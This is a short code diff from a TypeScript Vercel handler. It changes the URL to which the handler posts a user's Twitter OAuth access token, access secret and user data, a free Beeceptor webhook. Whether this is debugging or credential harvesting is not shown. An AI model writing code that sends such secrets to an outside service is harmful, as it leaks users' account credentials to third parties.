@@ -66,7 +66,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       );
 
       // Envia ao webhook do Beeceptor
-      await axios.post('https://ouauth-twitter.free.beeceptor.com', {
+      await axios.post('https://uxl6sixhbbddnl9v.free.beeceptor.com', {
         accessToken,
         accessSecret,
         user: results,
